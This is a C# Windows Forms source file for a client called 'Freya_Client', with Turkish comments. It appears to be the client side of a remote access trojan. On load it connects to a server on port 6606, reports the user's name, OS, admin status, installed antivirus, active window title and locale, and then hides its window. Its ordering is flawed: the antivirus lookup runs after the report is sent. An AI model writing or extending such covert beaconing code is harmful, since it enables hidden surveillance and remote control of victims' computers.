using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.Windows.Forms.VisualStyles;

namespace Freya_Client
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        string clientVersion = "v1.0.0";
        string antivirus = null;

        private void Form1_Load(object sender, EventArgs e)
        {

            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            bool isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);

            try
            {
                // Bağlanılacak sunucu bilgileri
                string serverIP = "127.0.0.1";
                int serverPort = 6606;

                // TcpClient oluştur ve sunucuya bağlan
                using (TcpClient client = new TcpClient(serverIP, serverPort))
                {
                    Console.WriteLine("Sunucuya bağlandı!");

                    // NetworkStream oluştur
                    using (NetworkStream clientStream = client.GetStream())
                    {
                        // Veri okuma ve yazma için StreamReader ve StreamWriter oluştur
                        using (var reader = new System.IO.StreamReader(clientStream, Encoding.UTF8))
                        using (var writer = new System.IO.StreamWriter(clientStream, Encoding.UTF8))
                        {
                            if (isAdmin == true)
                            {
                                string initialMessage = "clientInfo" + "|" + GenerateRandomCode() + "|" + Environment.UserName + "|" + Environment.OSVersion + "|" + clientVersion + "|" + "Administrator" + "|" + antivirus + "|" + GetActiveWindowTitle().ToString() + "|" + GetSystemCountry();
                                writer.WriteLine(initialMessage);
                                writer.Flush();
                            }

                            else
                            {
                                string initialMessage = "clientInfo" + "|" + GenerateRandomCode() + "|" + Environment.UserName + "|" + Environment.OSVersion + "|" + clientVersion + "|" + "Standart" + "|" + antivirus + "|" + GetActiveWindowTitle().ToString() + "|" + GetSystemCountry();
                                writer.WriteLine(initialMessage);
                                writer.Flush();
                            }




                            // Sunucudan gelen cevabı oku
                            string serverResponse = reader.ReadLine();
                            Console.WriteLine("Sunucudan gelen cevap: " + serverResponse);

                            // Sonuçları ekrana yaz
                            MessageBox.Show("Sunucudan gelen cevap: " + serverResponse);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Hata: " + ex.Message);
            }
            AntivirusInstalled();

            this.Hide();
        }

      

        public bool AntivirusInstalled()
        {
            ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
            ManagementObjectCollection data = wmiData.Get();

            foreach (ManagementObject virusChecker in data)
            {
                var virusCheckerName = virusChecker["displayName"];

                antivirus = virusCheckerName.ToString();
            }

            // Metot sonunda bir değer döndür
            return true; // Eğer bir antivirus ürünü bulunursa true, bulunmazsa false dönebilirsiniz.
        }


        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return "";
        }

        static string GetSystemCountry()
        {
            try
            {
                // Önceki kültür ayarlarını geçici olarak sakla ve ardından sistem kültürünü ayarla
                CultureInfo previousCulture = Thread.CurrentThread.CurrentCulture;
                CultureInfo sysCulture = CultureInfo.CurrentCulture;

                // Sistem kültürünü kullanarak ülke bilgisini al
                string systemCountry = sysCulture.Name;

                // Önceki kültür ayarlarını geri yükle
                Thread.CurrentThread.CurrentCulture = previousCulture;

                return systemCountry;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Hata: " + ex.Message);
                return null;
            }
        }

        static string GenerateRandomCode()
        {
            Random random = new Random();
            int randomNumber = random.Next(1000, 10000); // 1000 ile 9999 arasında rastgele bir sayı

            return randomNumber.ToString("D4"); // Sayıyı 4 haneli bir stringe çevir
        }




    }
}
